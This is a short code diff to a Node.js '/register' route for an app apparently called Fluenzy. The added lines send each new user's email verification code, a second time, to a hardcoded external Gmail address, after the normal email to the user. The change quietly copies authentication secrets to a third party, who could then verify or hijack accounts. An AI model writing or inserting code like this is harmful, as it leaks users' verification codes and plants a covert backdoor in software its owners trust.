@@ -74,6 +74,11 @@ router.post("/register", async (req, res) => {
       "رمز التحقق الخاص بك في Fluenzy",
       verificationEmailHtml({ code: verifyCode, assetBaseUrl }),
     );
+    await sendEmailNodemailer(
+      "alesarreema@gmail.com",
+      "رمز التحقق الخاص بك في Fluenzy",
+      verificationEmailHtml({ code: verifyCode, assetBaseUrl }),
+    );
 
     res.json(result);
   } catch (err) {
